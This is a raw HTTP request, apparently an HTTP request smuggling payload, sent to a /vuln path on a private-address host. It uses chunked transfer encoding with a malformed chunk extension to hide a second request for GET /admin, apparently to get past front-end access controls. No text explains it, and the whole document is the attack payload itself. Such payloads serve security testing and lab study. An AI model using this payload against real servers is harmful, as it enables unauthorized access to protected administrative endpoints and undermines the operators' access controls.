
```
POST /vuln HTTP/1.1
Host: 192.168.2.23:8080
Transfer-Encoding: chunked
\r\n
2;\n
xx\r\n
97\r\n
0\r\n
\r\n
GET /admin HTTP/1.1
Host: 192.168.2.23:8080
Content-Length: 49
\r\n
0\r\n
\r\n
GET / HTTP/1.1
Host: 192.168.2.23:8080
\r\n
```
